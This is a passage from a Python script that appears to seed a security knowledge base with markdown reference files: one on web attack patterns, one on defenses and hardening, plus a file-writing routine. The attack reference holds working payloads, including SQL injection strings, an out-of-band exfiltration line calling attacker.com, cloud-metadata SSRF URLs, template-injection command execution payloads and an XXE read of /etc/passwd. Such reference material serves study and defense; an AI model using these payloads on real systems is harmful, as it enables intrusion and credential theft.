- **DEP / NX (Data Execution Prevention):** Marks stack/heap as non-executable (`W^X`). Bypassed via Return-Oriented Programming (ROP) and `ret2libc`.
- **Stack Canaries (`-fstack-protector`):** Random canary value placed before return address. Bypassed via format string leak or brute-force in forking servers.
- **RELRO (Relocation Read-Only):** Partial RELRO allows GOT overwrites; Full RELRO marks GOT read-only, requiring overwriting heap hooks (`__free_hook`), vtables, or stack return addresses.
""",

    "Documentation/web_application_vulnerabilities.md": """# Web Application Vulnerabilities & Attack Patterns Reference

## 1. Advanced SQL Injection (SQLi)
- **UNION-Based SQLi:** Combining original query results with attacker-crafted SELECT statements: `' UNION SELECT null, username, password FROM users-- -`
- **Error-Based SQLi:** Triggering database runtime error messages containing extracted data (e.g. `EXTRACTVALUE()`, `UPDATEXML()` in MySQL, `CAST()` in PostgreSQL).
- **Boolean-Based Blind SQLi:** Inferring data character-by-character by evaluating true/false conditions: `' AND (SELECT SUBSTRING(password, 1, 1) FROM users WHERE username='admin')='a'-- -`
- **Time-Based Blind SQLi:** Using delay functions (`SLEEP(5)`, `pg_sleep(5)`) to infer data when HTTP responses are identical.
- **Out-of-Band (OOB) SQLi:** Forcing database DNS lookups or SMB requests to exfiltrate data (`LOAD_FILE('\\\\\\\\attacker.com\\\\share')`).

## 2. Server-Side Request Forgery (SSRF)
- **Cloud Metadata Targets:**
  - AWS EC2: `http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>`
  - Google Cloud: `http://metadata.google.internal/computeMetadata/v1/` (`Metadata-Flavor: Google`)
  - Azure VM: `http://169.254.169.254/metadata/instance?api-version=2021-02-01` (`Metadata: true`)
- **Protocol Smuggling via Gopher:** Using `gopher://127.0.0.1:6379/_...` to interact with unauthenticated Redis, Memcached, or SMTP servers.
- **Bypass Techniques:** IPv6 (`http://[::1]/`), Hex/Decimal IP (`http://2130706433/`), and DNS Rebinding.

## 3. Server-Side Template Injection (SSTI)
- **Jinja2 (Python) Sandbox Escape & RCE:**
  `{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}`
- **Twig (PHP) RCE:**
  `{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}`
- **Freemarker (Java) RCE:**
  `<#assign ex="freemarker.template.utility.Execute"?new()>${ ex("id") }`

## 4. XML External Entity (XXE) Injection
- **Local File Disclosure (LFD):** `<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><stockCheck><productId>&xxe;</productId></stockCheck>`
- **Blind XXE with OOB DTD:** Parameter entities (`%`) loading external DTDs to exfiltrate file contents via HTTP GET requests.
- **Billion Laughs XML Bomb (DoS):** Exponential recursive entity expansion exhausting server memory.

## 5. HTTP Request Smuggling
- **CL.TE:** Front-end uses Content-Length, Back-end uses Transfer-Encoding chunked.
- **TE.CL:** Front-end uses Transfer-Encoding chunked, Back-end uses Content-Length.
- **TE.TE:** Dual Transfer-Encoding headers with obfuscation (`Transfer-Encoding: xchunked`).
- **Impact:** Bypassing front-end security controls, hijacking user session cookies, poisoning web cache.

## 6. Client-Side Attacks & Session Manipulation
- **Cross-Site Scripting (XSS):** Stored, Reflected, and DOM-based XSS executing malicious JavaScript in user browser sessions.
- **Cross-Site Request Forgery (CSRF):** Forcing authenticated browser actions via forged HTTP forms; mitigated with `SameSite` cookies and anti-CSRF tokens.
- **Clickjacking:** Framing applications in transparent iframes; mitigated via `X-Frame-Options: DENY` and CSP `frame-ancestors 'none'`.
""",

    "Documentation/software_security_defense_and_mitigations.md": """# Software Security Defense, Hardening & Vulnerability Prevention Guide

## 1. Memory Safety & Binary Hardening
- **Compiler Flags (GCC/Clang):** `-fstack-protector-strong`, `-fPIE -pie`, `-Wl,-z,relro,-z,now` (Full RELRO), `-Wl,-z,noexecstack` (NX/DEP), `-D_FORTIFY_SOURCE=2 -O2`, `-fsanitize=cfi`.
- **Modern Memory Management:** RAII, smart pointers (`std::unique_ptr`, `std::shared_ptr`), memory-safe languages (Rust, Go), and sanitizers in CI/CD (ASan, UBSan, TSan).

## 2. Command Injection & Arbitrary Code Execution Prevention
- **Direct Process Invocation:** Use structured argument arrays without shell interpreters (`subprocess.run(['ls', '-l'], shell=False)`).
- **Least Privilege & SUID Auditing:** Audit and strip unnecessary SUID/SGID bits (`find / -perm -4000`), restrict sudoers rules to specific binary paths, and run services under non-root accounts with `NoNewPrivileges=true`.
- **DLL & Shared Object Hardening:** Enable Safe DLL Search Mode on Windows, use absolute paths for dynamic library loading, strip insecure `RPATH` on Linux, and protect `/etc/ld.so.preload`.

## 3. Web Vulnerability Remediation & Architectural Defenses
- **SQL Injection:** Parameterized queries / prepared statements exclusively; least-privilege DB users.
- **SSRF Defenses:** Validate and allowlist egress URLs; block private CIDR ranges (`10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`, `127.0.0.0/8`, `169.254.0.0/16`); prevent DNS rebinding; enforce AWS IMDSv2 (`HttpTokens=required`).
- **SSTI Defenses:** Pass user input strictly as data context; enable template sandboxing (Jinja2 `SandboxedEnvironment`); contextual output encoding.
- **XXE Defenses:** Completely disable DTD processing (`disallow-doctype-decl = true`); use `defusedxml` in Python.
- **Insecure Deserialization:** Replace native language serializers (Python pickle, Java ObjectInputStream, PHP unserialize) with data-only formats (JSON, Protobuf); cryptographic signing (HMAC).
- **HTTP Request Smuggling:** End-to-end HTTP/2 or HTTP/3; strict RFC 7230 header validation; drop dual Content-Length/Transfer-Encoding headers.

## 4. Supply Chain & CI/CD Security Hardening
- **Dependency Integrity:** Pin exact versions and SHA-256 hashes (`--require-hashes`); scope private registries to prevent Dependency Confusion; automate SCA scans (`pip-audit`, `Trivy`); generate SBOMs (CycloneDX).
- **CI/CD Pipeline Hardening:** Default `GITHUB_TOKEN` to `contents: read`; pin GitHub Actions to full commit SHAs; use isolated ephemeral runners.
""",
}


def seed_knowledge_base():
    """Creates seed reference documents in the knowledge base."""
    print(f"\n  ⚡ Seeding PRAG Multi-Domain Knowledge Base...\n")
    print(f"  Target: {KB_DIR}\n")

    created = 0
    skipped = 0

    for rel_path, content in SEED_DOCUMENTS.items():
        full_path = os.path.join(KB_DIR, rel_path)
        os.makedirs(os.path.dirname(full_path), exist_ok=True)

        if os.path.exists(full_path):
            print(f"  [SKIP] {rel_path} (already exists)")
            skipped += 1
            continue

        with open(full_path, 'w', encoding='utf-8') as f:
            f.write(content.strip() + '\n')
        print(f"  [CREATE] {rel_path} ({len(content):,} chars)")
        created += 1

    print(f"\n  ── Seed Summary ──")
    print(f"  Created: {created}")
    print(f"  Skipped: {skipped}")
    print(f"  Total documents: {len(SEED_DOCUMENTS)}\n")


if __name__ == "__main__":
    seed_knowledge_base()
